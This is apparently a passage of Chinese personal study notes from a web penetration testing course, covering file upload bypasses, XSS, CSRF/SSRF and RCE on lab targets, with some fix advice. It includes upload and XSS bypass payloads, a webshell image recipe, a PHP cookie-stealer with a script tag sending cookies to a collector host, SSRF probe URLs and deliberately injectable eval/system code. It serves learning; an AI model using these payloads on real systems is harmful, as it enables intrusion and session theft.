<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	白名单</span></span><br><span class="line"><span class="string">		MIME绕过	</span></span><br><span class="line"><span class="string">		%00截断		url编码</span></span><br><span class="line"><span class="string">		0x00截断		16进制</span></span><br><span class="line"><span class="string">		0x0a截断</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	upload-labs 第11关		白名单		%00截断</span></span><br><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">	抓包改请求行save_path=../upload-&gt;save_path=../upload/cmd.php%<span class="number">00</span>	传cmd.jpg里面写一句话木马</span><br><span class="line">	该过php版本，依然有问题可能是题<span class="number">12</span>的问题</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666526282632.png" alt="1666526282632"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	upload-labs 第12关		白名单		这个是post请求save_path</span></span><br><span class="line">注意此处%<span class="number">00</span>选中右键按如下点</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666527382840.png" alt="1666527382840"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据包的编码，除了请求头（url）是用部分编码部分不编码的方式比如空格用%20而数字英文字母不编码，其他正常显示给我们看的数据包都应该是未被编码的内容，比如说我需要截断符%00，写在get就不用动它，默认编过了码，写在post就需要先解码了</span><br></pre></td></tr></table></figure>

<h3 id="day22-文件上传之内容逻辑数组绕过"><a href="#day22-文件上传之内容逻辑数组绕过" class="headerlink" title="day22-文件上传之内容逻辑数组绕过"></a>day22-文件上传之内容逻辑数组绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload-labs	第13关</span></span><br><span class="line">windows cmd制作图片码（验证文件内容）			copy /?可查看帮助		</span><br><span class="line">	copy icon_bp.png /b + cmd.php /a img_shell.png</span><br><span class="line">    /a表示ascii文本		/b表示二进制文件</span><br><span class="line">    上传完可以知道保存位置		文件包含被包含文件被当作php文件执行</span><br><span class="line">    http:<span class="comment">//192.168.88.1/upload-labs/include.php?file=/upload/4220221023152308.png</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload-labs	14关		验证必须上传图像</span></span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>)</span><br><span class="line"><span class="comment"># upload-labs   15关		</span></span><br><span class="line">php内置函数获取图片类型		exif_imagetype</span><br><span class="line"><span class="comment"># upload-labs   16关	</span></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromjpeg</span>() 返回一图像标识符，代表了从给定的文件名取得的图像</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload-labs   17关			二次渲染</span></span><br><span class="line"><span class="comment">#move_upload_file文件已经到了服务器才做过滤</span></span><br><span class="line"><span class="comment">#	使用条件竞争		抓包intruder发11111次然后浏览器不停访问/upload-labs/upload/cmp.php访问成功但是有效事件很多，后面rename操作和浏览器访问冲突了</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666582542947.png" alt="1666582542947"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CVE-2017-12615			Tomcat中间件文件上传		上面的都是网站代码层面，中间件不同于php代码层面</span></span><br><span class="line">	按照教程做复制，然后一个是burp的http/<span class="number">1.1</span>点了发送之后变成http/<span class="number">2</span>,post请求那一栏格式也变了，不知为何?????</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	解析漏洞</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666626845217.png" alt="1666626845217"></p>
<h3 id="day23-文件上传之解析漏洞编辑器安全"><a href="#day23-文件上传之解析漏洞编辑器安全" class="headerlink" title="day23-文件上传之解析漏洞编辑器安全"></a>day23-文件上传之解析漏洞编辑器安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php.ini可以改开放端口</span><br><span class="line"></span><br><span class="line">apache</span><br><span class="line">    低版本apache漏洞	2.x		/123.php.xxx		被当作php文件执行</span><br><span class="line">        利用场景：文件上传</span><br><span class="line">    Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span><br><span class="line">        抓包1.php后面先加空格，然后在hex模式改成20改0A</span><br><span class="line"></span><br><span class="line">nginx</span><br><span class="line">	Nginx 解析漏洞复现</span><br><span class="line">		上传图片码，会返回保存路径---&gt;&gt;.jpg/.php		当作php文件执行</span><br><span class="line">	Nginx文件名逻辑漏洞 CVE-2013-4547</span><br><span class="line"></span><br><span class="line">编辑器</span><br><span class="line">	fckeditor		搜漏洞利用</span><br><span class="line"></span><br><span class="line">CMS</span><br><span class="line">	通达OA系统</span><br><span class="line"></span><br><span class="line">https://navisec.it/编辑器漏洞手册</span><br><span class="line">https:/www.jb51.net/softs/75619.html</span><br><span class="line">https://pan.baidu.com/share/init?surl=5gcdBuOFrN1F9xVN7Q7GSA  **enqx**</span><br><span class="line"></span><br><span class="line">第一步是看中间件版本查看是否有解析漏洞</span><br></pre></td></tr></table></figure>

<h3 id="day24-文件上传之WAF绕过及安全修复"><a href="#day24-文件上传之WAF绕过及安全修复" class="headerlink" title="day24-文件上传之WAF绕过及安全修复"></a>day24-文件上传之WAF绕过及安全修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">上传参数名解析：</span><br><span class="line">	Content-Disposition:	一般不可更改</span><br><span class="line">	name:					表单参数值，不能更改</span><br><span class="line">	filename: 				文件名，可以更改</span><br><span class="line">	Content-Type: 			文件MIME，是情况更改</span><br><span class="line">安全狗常见绕过方法</span><br><span class="line">	数据溢出-防匹配(xxx...)</span><br><span class="line">		加大量垃圾数据在post请求的两个键值对之间，用;划分</span><br><span class="line">	符号变异-防匹配(&#x27; &quot; ;)</span><br><span class="line">	数据截断-防溢出(%00 ; 换行)</span><br><span class="line">	重复数据-防匹配(参数多次)</span><br><span class="line"></span><br><span class="line">#Payload :</span><br><span class="line">大量垃圾数据缓冲溢出(Ccontent-Disposition,filename等)</span><br><span class="line"></span><br><span class="line">#单引号、双引号、分号</span><br><span class="line">filename=x.php</span><br><span class="line">filename=&quot;x.php</span><br><span class="line">filename=&#x27;x.php</span><br><span class="line">filename=&quot;a.jpg;.php&quot;;</span><br><span class="line"></span><br><span class="line"># %00、换行</span><br><span class="line">filename=&quot;a.php%00.jpg&quot;</span><br><span class="line">filename=&quot;Content-Disposition : form-data;name=&quot;upload_file&quot; ; x.php&quot;</span><br><span class="line">filename=&quot;x.jpg&quot; ; filename=&quot;x.jpg&quot; ; . . . ..filename=&quot;x.php&quot;;</span><br><span class="line">filename=</span><br><span class="line">&quot;</span><br><span class="line">x</span><br><span class="line">.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p</span><br><span class="line">&quot;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">#fuzz资源</span><br><span class="line">    https://github.com/fuzzdb-project/fuzzdb</span><br><span class="line">    https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">    </span><br><span class="line">#文件上传安全修复方案</span><br><span class="line">后端验证:采用服务端验证模式后缀检测:</span><br><span class="line">基于黑名单，白名单过滤MIME检测:</span><br><span class="line">基于上传自带类型检测</span><br><span class="line">内容检测:文件头，完整性检测</span><br><span class="line"></span><br><span class="line">自带函数过滤:参考uploadlabs函数</span><br><span class="line">自定义函数过滤:function check_file()&#123; &#125;</span><br><span class="line">WAF防护产品:宝塔,云盾,安全公司产品等</span><br></pre></td></tr></table></figure>

<h3 id="day25-XSS跨站之原理分类及攻击手法"><a href="#day25-XSS跨站之原理分类及攻击手法" class="headerlink" title="day25-XSS跨站之原理分类及攻击手法"></a>day25-XSS跨站之原理分类及攻击手法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTML DOM树</span><br><span class="line">	根元素&lt;html&gt;</span><br><span class="line">		&lt;head&gt;</span><br><span class="line">			&lt;title&gt;</span><br><span class="line">		&lt;body&gt;</span><br><span class="line">			&lt;a&gt;</span><br><span class="line">			&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">反射型</span><br><span class="line">	发包 x=xiaodi -&gt; x.php -&gt; 回包</span><br><span class="line">存储型</span><br><span class="line">	发包 x=xiaodi -&gt; x.php -&gt; 写入数据库 -&gt; x.php -&gt; 回显</span><br><span class="line">dom			前端js处理</span><br><span class="line">	发包 x=xiaodi -&gt; 本地浏览器静态前端代码 -&gt; x.php</span><br><span class="line"></span><br><span class="line">搜索XSS平台</span><br><span class="line"></span><br><span class="line">4个方面</span><br><span class="line">	1.有漏洞</span><br><span class="line">	2.对方浏览器版本不会拦截</span><br><span class="line">	3.盗取的cookie对方登陆过，且没有过滤</span><br><span class="line">	4.对方需要触发这个漏洞</span><br></pre></td></tr></table></figure>

<h3 id="day26-XSS跨站之订单及shell箱子反杀记"><a href="#day26-XSS跨站之订单及shell箱子反杀记" class="headerlink" title="day26-XSS跨站之订单及shell箱子反杀记"></a>day26-XSS跨站之订单及shell箱子反杀记</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">	$ip = getenv(&#x27;REMOTE_ADDR&#x27;);			//远程主机地址</span><br><span class="line">	$time = date(&#x27;Y-m-d H:i:s&#x27;);			//格式显示时间</span><br><span class="line">    $referer = getenv(&#x27;HTTP_REFERER&#x27;);		//链接来源</span><br><span class="line">    $fp = fopen(&#x27;cookie.txt&#x27;, &#x27;a&#x27;);			//打开cookie.txt,若不存在就创建它</span><br><span class="line">    fwrite($fp, &quot;	IP:&quot;.$ip.&quot;	Date and Time: &quot;.$time.&quot;	Referer:&quot;.$referer.&quot;	Cookie:&quot;.$cookie.&quot;|||&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#攻击语句				此处document.cookie为空值不知为何</span><br><span class="line">&lt;script src=&#x27;http://192.168.88.1/getcookie.php?cookie=&#x27;+document.cookie&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">postman软件</span><br><span class="line">	https://www.postman.com/downloads/ </span><br><span class="line">各种后门文件</span><br><span class="line">https://github.com/tennc/webshell</span><br><span class="line">0:40碟中谍</span><br><span class="line">笔记中有beef-xss kali安装的过程</span><br><span class="line">如何判定有没有后门</span><br><span class="line">	1.是脚本，看一下有没有对莫名奇妙地址发包</span><br><span class="line">	2.抓包，对进程抓包</span><br><span class="line"></span><br><span class="line">kali自带beef-xss		不过还是要下载</span><br><span class="line">可以通过这个学习攻击手法</span><br><span class="line"></span><br><span class="line">我提交的东西管理员会查看</span><br><span class="line"></span><br><span class="line">session</span><br><span class="line">	phpinfo();里面有</span><br></pre></td></tr></table></figure>

<h3 id="day27-XSS跨站之代码及httponly绕过"><a href="#day27-XSS跨站之代码及httponly绕过" class="headerlink" title="day27-XSS跨站之代码及httponly绕过"></a>day27-XSS跨站之代码及httponly绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">	cookie中设置httponly属性，js脚本讲无法读取到cookie信息，这样能有效防止XSS攻击的攻击手法</span><br><span class="line">	php.ini中session.cookie_httponly=<span class="number">1</span></span><br><span class="line">或者代码中</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.cookie_httponly&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//或者	session_set_cookie_param(0, NULL. NULL NULL, TRUE);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">httponly的绕过</span><br><span class="line">	进入后台方式</span><br><span class="line">    	<span class="number">1</span>.cookie</span><br><span class="line">    	<span class="number">2</span>.密码</span><br><span class="line">    <span class="number">1</span>.浏览器为保存账号密码：需要xss产生登陆地址，利用表单劫持</span><br><span class="line">    <span class="number">2</span>.浏览器保存账号密码：产生在后台的xss，存储型如留言等，浏览器读取账号密码</span><br><span class="line"></span><br><span class="line">安装xss-labs</span><br><span class="line">	git <span class="keyword">clone</span> https:<span class="comment">//github.com/do0dl3/xss-labs</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xss-lab		靶场重写了alert()函数</span><br><span class="line">	level1</span><br><span class="line">		get请求xss</span><br><span class="line">	level2 		htmlspecialchars()函数讲特殊字符转换为html实体</span><br><span class="line">		&amp;（和号） 成为&amp;amp;</span><br><span class="line">        &quot; （双引号） 成为 &amp;quot;</span><br><span class="line">        &#x27; （单引号） 成为 &amp;apos;</span><br><span class="line">        &lt; （小于） 成为 &amp;lt;</span><br><span class="line">        &gt; （大于） 成为 &amp;gt;</span><br><span class="line">		&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;		表单闭合前面的双引号和箭头符号	</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666967810933.png" alt="1666967810933"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level3		没空子钻了	不接着钻</span><br><span class="line">	&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666969051819.png" alt="1666969051819"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level4</span><br><span class="line">	&quot; onclick=&quot;alert(1)</span><br><span class="line">level5		on-&gt;o_n</span><br><span class="line">	1&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;</span><br><span class="line">level6	没有过滤大小写</span><br><span class="line">	1&quot;&gt;&lt;a Href=&#x27;JavaScript:alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667010406401.png" alt="1667010406401"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level7</span><br><span class="line">	1&quot;&gt;&lt;a Hhrefref=&#x27;JavaSscriptcript:alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667011335590.png" alt="1667011335590"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level8	不好绕 unicode网格编码	&amp;#XXXXX&lt;-&gt;(例：&amp;#21621：呵)		这个叫html实体编码</span><br><span class="line">	javascript:alert(&quot;1&quot;)</span><br><span class="line">	&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br><span class="line">	这个绕过不太理解按理说script会被过滤掉的</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667011477422.png" alt="1667011477422"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level9		检测http://</span><br><span class="line">	&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br><span class="line">level10		代码审计</span><br><span class="line">	t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667034128912.png" alt="1667034128912"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level11		审计	$_SERVER[&#x27;HTTP_REFERER&#x27;]</span><br><span class="line">	抓包加</span><br><span class="line">		Referer:&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span><br><span class="line">level12		审计	$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]</span><br></pre></td></tr></table></figure>

<h3 id="day28-XSS跨站之WAF绕过及安全修复"><a href="#day28-XSS跨站之WAF绕过及安全修复" class="headerlink" title="day28-XSS跨站之WAF绕过及安全修复"></a>day28-XSS跨站之WAF绕过及安全修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">waf防护xss-labs的第一关</span><br><span class="line">	针对&lt;o*&gt; &lt;s*&gt;				onclick		script</span><br><span class="line"></span><br><span class="line">xss fuzz网站</span><br><span class="line">	http://xssfuzzer.com/fuzzer.html</span><br><span class="line">XSStrike	xss工具</span><br><span class="line">	python xsstrike.py -u &quot;http://192.168.213.135/xss-labs/level1.</span><br><span class="line">php?name=&quot; --fuzzer</span><br><span class="line">	</span><br><span class="line">修复建议</span><br><span class="line">	1.开启httponly，输入过滤，输出过滤</span><br></pre></td></tr></table></figure>

<h3 id="day29-CSRF及SSRF漏洞案例讲解"><a href="#day29-CSRF及SSRF漏洞案例讲解" class="headerlink" title="day29-CSRF及SSRF漏洞案例讲解"></a>day29-CSRF及SSRF漏洞案例讲解</h3><p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667053435936.png" alt="1667053435936"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CSRF防御方案</span><br><span class="line">	1.当用户发送重要请求时需要输入原始密码</span><br><span class="line">	2.设置随机token</span><br><span class="line">	3.检验refer来源，请求时判断链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</span><br><span class="line">	4.设置验证码</span><br><span class="line">	5.限制请求方式只能为post</span><br><span class="line">SSRF(Server-Side Request Forgery:服务器请求伪造)</span><br><span class="line">	目标	从外网无法访问的内部系统</span><br><span class="line">	原因	由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</span><br><span class="line">	挖掘 从web功能上寻找</span><br><span class="line">			1.分享：通过URL地址分享网页内容</span><br><span class="line">			2.转码服务：通过URL地址把源地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">			3.在线翻译：通过URL翻译对应文本的内容。提供此功能的国内公司有百度、有道等</span><br><span class="line">			4.图片加载与下载：通过URL地址或下载图片</span><br><span class="line">			5.图片、文章收藏功能</span><br><span class="line">			6.未公开的api实现以及其他调用URL的功能</span><br><span class="line">		从URL关键字中寻找</span><br><span class="line">			share wap url link src source target u target 3g display sourceURI imageURL domain</span><br><span class="line">	验证 1.基本判断（排除）</span><br><span class="line">    		burpsuite抓包</span><br><span class="line">            右键打开图片</span><br><span class="line">	绕过 1.http://A.com@10.10.10.10</span><br><span class="line">		2.ip地址转换成进制		115.239.210.26=16373751032</span><br><span class="line">		</span><br><span class="line">各个协议调用探针：http，file，dict，ftp，gopher</span><br><span class="line">	http://192.168.64.144/phpmyadmin</span><br><span class="line">	file:///d:/www.txt</span><br><span class="line">	dict://192.168.64.144:3306/info</span><br><span class="line">	ftp://192.168.64.144:21</span><br><span class="line">漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667057783285.png" alt="1667057783285"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找个网站上述符合的地方</span><br><span class="line">	输入http://127.0.0.1测试</span><br></pre></td></tr></table></figure>

<h3 id="day30-RCE代码及命令执行漏洞全解"><a href="#day30-RCE代码及命令执行漏洞全解" class="headerlink" title="day30-RCE代码及命令执行漏洞全解"></a>day30-RCE代码及命令执行漏洞全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">RCE-&gt;执行脚本代码</span><br><span class="line">命令执行-&gt;执行系统命令</span><br><span class="line"></span><br><span class="line">#代码执行		eval会把字符串当作php来执行</span><br><span class="line">&lt;?php</span><br><span class="line">$test=$_GET[&quot;cmd&quot;];</span><br><span class="line">echo gettype($test);			//string</span><br><span class="line">eval($test);</span><br><span class="line">echo gettype(eval($test));		//null</span><br><span class="line">?&gt;</span><br><span class="line">http://192.168.88.1/test03.php?cmd=phpinfo();</span><br><span class="line"></span><br><span class="line">#php中system用于执行外部程序，并且显示输出</span><br><span class="line">	ver显示版本信息</span><br><span class="line">&lt;?php</span><br><span class="line">$code = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">system($code);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#漏洞形成条件</span><br><span class="line">可控变量 漏洞函数</span><br><span class="line"></span><br><span class="line">墨者靶场</span><br><span class="line">	php代码溯源4</span><br><span class="line">		